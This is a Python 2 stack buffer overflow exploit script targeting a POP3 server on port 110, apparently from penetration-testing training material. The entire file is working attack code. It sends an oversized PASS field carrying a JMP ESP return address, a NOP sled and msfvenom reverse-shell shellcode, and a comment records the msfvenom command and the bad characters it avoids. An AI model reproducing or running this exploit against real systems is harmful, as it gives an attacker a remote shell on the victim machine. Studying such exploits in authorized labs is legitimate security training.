#!/usr/bin/python
# -*- coding: utf-8 -*-
# Created by TJnull

import socket
import struct

RHOST = "192.168.117.132"    #String
RPORT = 110               #integer

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buf_totlen = 3500         #integer
offset_eip = 2606         #integer
ptr_jmp_esp = 0x5F4A358F  # hex integer (0x<mem>)

#msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f c -a x86 --platform windows -b "\x00\x0A\x0D" -e x86/shikata_ga_nai
#bad char list \x00\x0A\x0D (cfr file 5)
shellcode = ("\xdd\xc4\xbd\xaf\xc6\x0e\xd3\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x68\x13\x03\xc7\xd5\xec\x26\xeb\x32\x72"
"\xc8\x13\xc3\x13\x40\xf6\xf2\x13\x36\x73\xa4\xa3\x3c\xd1\x49"
"\x4f\x10\xc1\xda\x3d\xbd\xe6\x6b\x8b\x9b\xc9\x6c\xa0\xd8\x48"
"\xef\xbb\x0c\xaa\xce\x73\x41\xab\x17\x69\xa8\xf9\xc0\xe5\x1f"
"\xed\x65\xb3\xa3\x86\x36\x55\xa4\x7b\x8e\x54\x85\x2a\x84\x0e"
"\x05\xcd\x49\x3b\x0c\xd5\x8e\x06\xc6\x6e\x64\xfc\xd9\xa6\xb4"
"\xfd\x76\x87\x78\x0c\x86\xc0\xbf\xef\xfd\x38\xbc\x92\x05\xff"
"\xbe\x48\x83\x1b\x18\x1a\x33\xc7\x98\xcf\xa2\x8c\x97\xa4\xa1"
"\xca\xbb\x3b\x65\x61\xc7\xb0\x88\xa5\x41\x82\xae\x61\x09\x50"
"\xce\x30\xf7\x37\xef\x22\x58\xe7\x55\x29\x75\xfc\xe7\x70\x12"
"\x31\xca\x8a\xe2\x5d\x5d\xf9\xd0\xc2\xf5\x95\x58\x8a\xd3\x62"
"\x9e\xa1\xa4\xfc\x61\x4a\xd5\xd5\xa5\x1e\x85\x4d\x0f\x1f\x4e"
"\x8d\xb0\xca\xc1\xdd\x1e\xa5\xa1\x8d\xde\x15\x4a\xc7\xd0\x4a"
"\x6a\xe8\x3a\xe3\x01\x13\xad\xcc\x7e\x6e\xac\xa5\x7c\x90\xab"
"\x0c\x08\x76\xd9\x7e\x5c\x21\x76\xe6\xc5\xb9\xe7\xe7\xd3\xc4"
"\x28\x63\xd0\x39\xe6\x84\x9d\x29\x9f\x64\xe8\x13\x36\x7a\xc6"
"\x3b\xd4\xe9\x8d\xbb\x93\x11\x1a\xec\xf4\xe4\x53\x78\xe9\x5f"
"\xca\x9e\xf0\x06\x35\x1a\x2f\xfb\xb8\xa3\xa2\x47\x9f\xb3\x7a"
"\x47\x9b\xe7\xd2\x1e\x75\x51\x95\xc8\x37\x0b\x4f\xa6\x91\xdb"
"\x16\x84\x21\x9d\x16\xc1\xd7\x41\xa6\xbc\xa1\x7e\x07\x29\x26"
"\x07\x75\xc9\xc9\xd2\x3d\xf9\x83\x7e\x17\x92\x4d\xeb\x25\xff"
"\x6d\xc6\x6a\x06\xee\xe2\x12\xfd\xee\x87\x17\xb9\xa8\x74\x6a"
"\xd2\x5c\x7a\xd9\xd3\x74")

buffer = "A"*offset_eip
buffer += struct.pack("<I", ptr_jmp_esp)
buffer += "\x90" * 16 #nopsled
buffer += shellcode
buffer += "C"*(buf_totlen - len(buffer))

try:
    print "\nSending buffer (╯°□°）╯︵ ┻━┻ "
    s.connect((RHOST, RPORT))
    s.recv(1024)
    s.send('USER username' + '\r\n')
    s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "Exploit completed! Check your listener...if you created one (>ლ)"

except:
       print "Could not connect to POP3! ¯\_(ツ)_/¯"
